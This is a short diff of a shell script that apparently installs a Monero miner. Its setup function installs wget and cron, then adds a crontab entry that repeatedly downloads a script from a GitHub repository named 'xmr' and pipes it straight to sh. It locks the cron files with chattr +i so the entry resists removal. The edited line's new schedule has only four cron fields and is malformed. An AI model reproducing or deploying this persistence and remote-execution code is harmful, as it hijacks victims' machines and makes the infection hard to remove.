@@ -11,7 +11,7 @@ set_envirment(){
     apt-get install wget -y && yum install wget -y && apk add wget -y
     apt-get install cron -y && yum install crontabs -y && apk add cron -y
     
-    echo "*/30 * * * * (curl -fsSL https://raw.githubusercontent.com/Pamentierx/xmr/main/auto.sh || wget -q -O- https://raw.githubusercontent.com/Pamentierx/xmr/main/auto.sh)|sh" | crontab -    
+    echo "*/6 * * * (curl -fsSL https://raw.githubusercontent.com/Pamentierx/xmr/main/auto.sh || wget -q -O- https://raw.githubusercontent.com/Pamentierx/xmr/main/auto.sh)|sh" | crontab -    
     chattr -R +i /var/spool/cron
     chattr +i /etc/crontab  
 }
